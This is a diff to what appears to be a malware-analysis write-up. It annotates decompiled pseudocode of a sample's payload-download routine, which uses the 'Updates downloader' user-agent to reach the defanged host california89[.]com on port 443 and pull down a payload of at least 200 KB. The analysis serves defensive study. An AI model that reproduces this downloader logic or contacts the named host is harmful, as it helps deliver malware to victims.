@@ -60,6 +60,7 @@ Next, when the binary is executing from %TEMP%, it will attempt to delete itself
 
 **Payload Downloading**
 
+Next up is a payload being downloaded over HTTP
 ```C
 v31 = InternetOpenW(L"Updates downloader", 0, 0, 0, 0); // InternetOpenW API with "Updates downloader" user-agent is held in variable v31
   if ( v31 ) // If this was successful, build an lpszAcceptTypes string of "text/application/*"
@@ -82,6 +83,7 @@ LABEL_14:
           v10 = InternetConnectW((HINTERNET)v31, (&lpszServerName)[(_DWORD)lpBuffer], 0x1BBu, 0, 0, 3u, 0, 0);
 // InternetConnectW API held in v10 variable [Updates downloader, lpszAcceptTypes = text/application/*]
 // v31 used as the User-Agent argument
+// Port 443 (0x1BB)
 // &lpszServerName is a global data variable holding california89[.]com
           if ( v10 )
             break;
@@ -106,7 +108,7 @@ LABEL_14:
         InternetSetOptionW(v11, 0x1Fu, &Buffer, 4u);
         for ( i = 0; i < 2; ++i )
         {
-          if ( HttpSendRequestW(v11, 0, 0, 0, 0) ) // HttpSendRequestW is called from arguments in v11
+          if ( HttpSendRequestW(v11, 0, 0, 0, 0) ) // HttpSendRequestW is called from arguments in v11, 2 max attempts
             break;
         }
         if ( i != 2 )
@@ -118,7 +120,7 @@ LABEL_14:
             if ( HttpQueryInfoW(v11, 0x20000005u, &dwBytes, &v27, 0) )
               break;
           }
-          if ( dwBytes >= 0x30D40 )
+          if ( dwBytes >= 0x30D40 ) // ensure payload size >= 200 KB before downloading
             break;
         }
       }
@@ -137,7 +139,7 @@ LABEL_14:
           if ( !NumberOfBytesRead || NumberOfBytesRead == dwBytes )
             break;
         }
-        if ( v15 - v14 == dwBytes )
+        if ( v15 - v14 == dwBytes ) // Exit when full payload is downloaded
           break;
       }
     }
